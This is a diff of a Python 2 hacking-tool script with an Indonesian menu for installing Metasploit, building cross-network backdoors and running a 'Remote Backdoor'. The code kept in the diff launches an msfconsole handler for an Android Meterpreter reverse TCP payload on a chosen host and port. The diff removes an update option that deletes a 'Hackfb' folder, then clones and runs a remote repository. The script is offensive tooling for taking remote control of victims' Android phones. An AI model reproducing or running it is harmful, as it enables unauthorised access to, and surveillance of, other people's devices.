@@ -34,7 +34,6 @@ def menu():
     print "\033[36;1m[1] \033[33;1mInstall metasploit"
     print "\033[36;1m[2] \033[33;1mBuat backdoor beda jaringan"
     print "\033[36;1m[3] \033[33;1mRemote Backdoor"
-    print "\033[36;1m[4] \033[33;1mUpdate Script"
     print "\033[36;1m[0] \033[31;1mKeluar/Exit"
     print
     pil = raw_input("\033[37;1mPilih Menu : ")
@@ -115,14 +114,6 @@ def menu():
           os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
           raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
           bersih()
-    elif pil == "4":
-        print "\033[33;1mUpdate installing...."
-        time.sleep(1)
-        os.system("rm -fr Hackfb")
-        os.system("git clone https://github.com/Seven-Gaming/msfnob")
-        time.sleep(1)
-        os.system("cd msfnob")
-        os.system("python2 msfnob.py")
     elif pil == "0":
         os.system("exit")
         print
